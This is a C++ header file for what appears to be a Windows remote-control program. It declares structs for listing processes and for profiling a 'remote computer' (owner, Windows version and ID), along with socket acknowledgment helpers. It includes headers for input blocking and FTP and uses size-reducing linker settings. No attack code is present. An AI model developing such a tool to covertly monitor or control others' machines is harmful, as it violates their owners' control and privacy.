#if !defined _GLOBAL_H_
#define _GLOBAL_H_

#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.

//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include <winsvc.h>
#include <process.h>
#include <psapi.h>

#ifndef NO_PJAM3
#include <signal.h>
#endif

#include <string>
#include <windows.h>
#include <shellapi.h>
#include <winable.h> //for  BlockInput() function
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <wininet.h> // FTP session
#include <direct.h> //directory management
#include <psapi.h>
#include <conio.h>
#include <list>
using namespace std;

#include "Socket_t.h"
#include "SocketException_t.h"


#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

//-------------------------------------------------------------
// Process struct : holds the name and ID of a process
//-------------------------------------------------------------
typedef struct Process {
	string PID;
	string name;

} Pros;

//---------------------------------------------------------------------
// CompInfo struct : holds the info of the remote computer
//---------------------------------------------------------------------
typedef struct CompInfo {
	string CompName;
	string OwnerName;
	string WinVersion;
	string SystemDir;
	string ProcessorType;
	string ProcessorSpeed;
	string WinID;
} CompInfo;

//-------------------------------------------------------------
// StringToInt Function : takes a variable of char* type and
// converts it to int type which is the returning value.
//-------------------------------------------------------------
const int StringToInt(char*);

//-------------------------------------------------------------
// StringToInt Function : takes a variable of string type and
// converts it to int type which is the returning value.
//-------------------------------------------------------------
const int StringToInt(string);

//-------------------------------------------------------------
// sendAck Function : sends an Acknowledgment signal through the
// given socket to the other side to confirm
// that it got the information that was recieved.
//-------------------------------------------------------------
void sendAck(Socket_t *Sock);

//-------------------------------------------------------------
// getAck Function : gets an Acknowledgment signal through the
// given socket from the other side to confirm
// that it got the information that was sent.
//-------------------------------------------------------------
void getAck(Socket_t *Sock);

#endif